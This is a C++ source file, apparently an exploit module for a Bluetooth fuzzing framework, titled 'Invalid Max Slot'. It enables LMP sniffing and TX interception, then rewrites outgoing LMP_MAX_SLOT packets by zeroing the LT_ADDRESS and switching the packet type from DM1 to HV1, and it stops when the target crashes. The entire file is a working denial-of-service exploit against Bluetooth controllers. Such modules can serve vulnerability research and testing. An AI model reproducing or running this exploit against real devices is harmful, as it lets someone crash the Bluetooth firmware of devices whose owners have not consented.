#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Setup
static const char *module_name()
{
    return "Invalid Max Slot";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 1500;
    config->bluetooth.disable_role_switch = false;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{

    // Wait for LMP_MAX_SLOT
    if (pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 45))
    {
        // Change LT_ADDRESS to 0
        pkt_buf[0] = (pkt_buf[0] & (~(0b111)));
        // Change Channel from DM1 to DM3/2-DH3 (Optional)
        // pkt_buf[0] = (pkt_buf[0] & (~(0b1111 << 3))) | (0x05 << 3);
        // Change Channel from DM1 to HV1
        pkt_buf[0] = (pkt_buf[0] & (~(0b1111 << 3))) | (0x0a << 3);
        m_conf_stop_on_crash(p, 1);
        return 1;
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}